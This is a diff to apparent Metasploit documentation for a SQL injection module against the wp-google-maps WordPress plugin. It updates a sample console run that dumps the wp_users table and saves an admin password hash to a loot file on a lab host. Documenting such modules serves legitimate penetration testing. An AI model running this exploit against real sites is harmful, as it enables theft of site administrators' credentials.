@@ -20,15 +20,14 @@ Change the table prefix. By default, this option is set to `wp_`.
 
 ## Scenarios
 
-### wp-google-maps 7.11.17 on WordPress 5.1.1
+### wp-google-maps 7.11.17 on WordPress 4.9.5
 
 ```
-msf5 auxiliary(admin/http/wp_google_maps_sql_injection) > run
-[*] Running module against 127.0.0.1
+msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
+[*] Running module against 172.22.222.144
 
-[*] 127.0.0.1:80 - Trying to retrieve the wp_users table...
-[+] 127.0.0.1:80 - Found admin $P$Bbfp4csOlKV/XoKGjqViW1pWFzTlQz/ junk@junk.tld
-[!] No active DB -- Credential data will not be saved!
-[+] Credentials saved in: /home/user/.msf4/loot/2019(...).txt
+[*] 172.22.222.144:80 - Trying to retrieve the wp_users table...
+[+] Credentials saved in: /home/msfdev/.msf4/loot/20190415065921_default_172.22.222.144_wp_google_maps.j_022930.bin
+[+] 172.22.222.144:80 - Found msfdev <hash> <email>
 [*] Auxiliary module execution completed
 ```
